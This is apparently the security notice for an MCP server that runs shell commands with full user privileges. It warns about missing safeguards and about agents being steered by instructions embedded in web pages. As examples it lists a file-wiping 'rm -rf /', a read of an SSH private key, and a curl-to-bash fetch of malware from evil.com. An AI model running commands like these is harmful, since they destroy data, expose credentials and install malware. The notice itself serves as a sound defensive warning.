# Security

## ⚠️ WARNING: This Tool Executes Shell Commands

**TL;DR**: This MCP server runs whatever commands you send it with your full user privileges. If someone malicious gets access to it, they own your system. Treat it like an SSH connection. Note that combined with things like letting your agent read web pages which might have embedded instructions in them and also giving them this tool is like juggling chainsaws. After lighting them on fire.

## What Can Go Wrong

1. **Complete System Access**: Any command sent through this tool runs as YOU. That means:
   - `rm -rf /` will delete your files
   - `cat ~/.ssh/id_rsa` will expose your SSH keys
   - `curl evil.com/malware.sh | bash` will install malware

2. **No Safety Rails**: This tool has:
   - ❌ No command filtering
   - ❌ No sandboxing
   - ❌ No rate limiting
   - ❌ No authentication

3. **Persistent Sessions**: Commands run in persistent tmux sessions that maintain state between requests. Environment variables, working directories, and running processes persist.

## Red Flags to Watch For

If you see these, something bad might be happening:
- Unexpected network connections
- Commands you don't recognize in your history
- High CPU/memory usage
- Files changing that shouldn't

## The Bottom Line

This is a powerful tool that gives complete shell access. Use it like you would use `sudo` - carefully and only when needed. When in doubt, run it in an isolated environment.
